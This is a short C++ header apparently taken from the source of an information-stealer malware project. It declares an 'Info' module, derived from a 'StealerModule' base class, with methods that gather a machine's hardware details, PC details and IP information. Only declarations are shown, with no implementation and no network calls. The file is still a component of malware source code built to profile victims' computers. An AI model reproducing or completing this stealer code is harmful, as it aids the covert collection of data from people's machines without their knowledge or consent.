//
// Created by .1qxz on 08.06.2024.
//

#ifndef STEALER_INFO_H
#define STEALER_INFO_H


#include "../StealerModule.h"
#include <windows.h>
#include "../../utils/OSUtil.h"
#include "json.hpp"

using json = nlohmann::json;

class Info : public StealerModule {
public:
    void execute(fs::path &root) override;
private:
    static void writeHardwareInfo(std::stringstream &ss);
    static void writePCInfo(std::stringstream &ss);
    static void writeIPInfo(std::stringstream &ss);
};


#endif //STEALER_INFO_H
